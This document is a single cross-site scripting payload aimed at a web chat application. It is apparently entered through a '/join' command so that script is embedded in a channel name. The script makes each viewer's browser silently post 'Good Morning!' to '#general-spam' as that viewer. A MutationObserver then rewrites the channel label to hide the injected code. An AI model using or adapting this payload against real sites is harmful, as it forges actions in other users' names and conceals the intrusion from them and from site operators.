/join #magic channel <script>
$.post("/post", "message=Good Morning!&channel=#general-spam", function (){
	var temp = current_channel;
	current_channel="#general-spam";RefreshMessages(true) ;
	current_channel=temp;
	if ( $('#current-channel').text().slice(0,14) == '#magic channel') {$('#current-channel').text('#magic channel'); }

	var target = document.getElementById('current-channel');
	var config = {characterData: false, attributes: false, childList: true, subtree: false};
	var callback = function(mutationList){
		for (var mutation of mutationList){
			if ( $('#current-channel').text().slice(0,14) == '#magic channel' && $('#current-channel').text().length > 14) {
				$('#current-channel').text('#magic channel');
			}
		}
	}

	var observer = new MutationObserver(callback);
	observer.observe(target, config);	

});

</script>